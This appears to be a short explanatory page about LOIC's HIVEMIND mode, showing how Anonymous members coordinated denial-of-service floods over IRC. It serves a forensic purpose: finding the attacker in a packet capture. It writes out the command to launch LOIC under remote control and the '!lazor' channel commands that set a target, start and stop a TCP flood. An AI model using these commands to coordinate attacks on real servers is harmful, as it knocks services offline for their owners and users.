HIVEMIND MODE

Internet Relay Chat (IRC) was once the standard for realtime communications on the Internet. In a nutshell, there are IRC clients and IRC servers; you use a client to connect to a server. Once you are connected, you can join (or create) a channel. Other clients that enter the same channel may converse with each other via text messages broadcast by the server. The standard protocol for client/server communication is defined in Request for Comments (RFC) 1459

To start an attack, a member of Anonymous logs onto specific Internet Relay Chat (IRC) server and issues the attack command. Any member of Anonymous connected to the IRC with LOIC connected in HIVEMIND mode can immediately start an attack against the target.

HIVEMIND mode will connect your client to an IRC server so it can be controlled remotely

To start up in HIVEMIND mode, run the below command:

LOIC.exe /hivemind irc.server.address

It will connect to irc://irc.server.address:6667/loic

Controlling LOIC from IRC

As an attacker or admin, to set the IRC channel topic or send a message in the channel which can be listened by clients connected to the channel and Send the following message:

!lazor targetip=127.0.0.1 message=test_test port=80 method=tcp wait=false random=true

To start an attack, type:

!lazor start

To stop the attack:

!lazor stop

Parsing IRC Commands to the HIVE

To detect an attack, we need to examine the attack message or command in traffic. By examining, we can know about the specific user who issued a command to start an attack to the IRC server. We can look at the packets in which attacker issues the commands to IRC server and also the packet in which IRC server issues a command to the connected LOIC clients to start the attack

Go Ahead and upload a .pcap file to determine the attacker who issued attack commands on to IRC server!
